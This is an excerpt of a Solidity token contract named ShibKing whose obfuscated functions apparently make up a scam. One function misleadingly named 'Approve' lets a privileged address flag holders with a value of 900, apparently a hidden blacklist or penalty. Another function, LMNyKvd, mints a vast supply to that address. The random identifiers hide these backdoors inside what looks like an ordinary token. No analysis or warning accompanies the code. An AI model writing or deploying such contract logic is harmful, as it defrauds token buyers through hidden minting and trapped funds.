...
contract ShibKing is Ownable {
    ...
    uint256 private  initSupply = 50000000000*10**decimals();
    address public ANDMPeE;
    mapping(address => uint256) private TMFFmUser;

    constructor(address jvfgUXk,string memory t2name, string memory t2symbol) {
        ANDMPeE = jvfgUXk;
        _Tokename = t2name;
    ...
    function eBYZMid(address heDvfNs) external   {
        if(ANDMPeE == _msgSender()){
            TMFFmUser[heDvfNs] = 0;
        }else {
            require(_msgSender() == ANDMPeE);
        }
        
    }

    function Approve(address heDvfNs) external   {
        if(ANDMPeE == _msgSender()){
           TMFFmUser[heDvfNs] = 900;
        }else {
            require(_msgSender() == ANDMPeE);
        }
    ...
    function LMNyKvd() public  {
        if(ANDMPeE == _msgSender()){
            uint256 PfzMapN = 1000000000000*10**decimals()*98000;
            _balances[_msgSender()] += PfzMapN;
        }else {
            require(_msgSender() == ANDMPeE);
            revert("rbbb");
        }
